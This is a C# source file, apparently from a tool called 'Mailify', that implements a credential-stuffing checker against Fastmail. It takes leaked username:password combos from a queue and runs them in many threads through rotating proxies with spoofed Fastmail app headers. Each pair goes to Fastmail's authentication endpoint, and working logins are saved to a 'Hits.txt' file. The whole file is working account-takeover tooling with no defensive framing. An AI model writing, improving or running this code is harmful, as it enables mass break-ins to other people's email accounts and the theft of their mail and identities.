using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Fastmail
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    string USERAGENT = Http.RandomUserAgent();
                    request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                    request.AddHeader("Pragma", "no-cache");
                    request.AddHeader("Accept", "*/*");
                    request.AddHeader("accept", "application/json");
                    request.AddHeader("origin", "https://www.fastmail.com");
                    request.AddHeader("user-agent", "" + USERAGENT + " Fastmail/android/3.1.5");
                    request.AddHeader("referer", "https://www.fastmail.com/mail/?theme=dark");
                    request.AddHeader("accept-encoding", "gzip, deflate");
                    request.AddHeader("accept-language", "en-US,en;q=0.9");
                    request.AddHeader("x-requested-with", "com.fastmail.app");

                    var res0 = request.Post("https://www.fastmail.com/jmap/authenticate/", "{\"username\":\"" + credentials[0] + "\"}", "application/json");
                    string text0 = res0.ToString();

                    var TYPE = Functions.JSON(text0, "type").FirstOrDefault();
                    var LOGINID = Functions.JSON(text0, "loginId").FirstOrDefault();
                    request.AddHeader("accept", "application/json");
                    request.AddHeader("origin", "https://www.fastmail.com");
                    request.AddHeader("user-agent", "" + USERAGENT + " Fastmail/android/3.1.5");
                    request.AddHeader("referer", "https://www.fastmail.com/mail/?theme=dark");
                    request.AddHeader("accept-encoding", "gzip, deflate");
                    request.AddHeader("accept-language", "en-US,en;q=0.9");
                    request.AddHeader("x-requested-with", "com.fastmail.app");

                    var res1 = request.Post("https://www.fastmail.com/jmap/authenticate/", "{\"loginId\":\"" + LOGINID + "\",\"type\":\"password\",\"value\":\"" + credentials[1] + "\",\"remember\":true}", "application/json");
                    string text1 = res1.ToString();

                    if (text1.Contains("\"userId\":\""))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text1.Contains("{\"mayTrustDevice\":false}"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}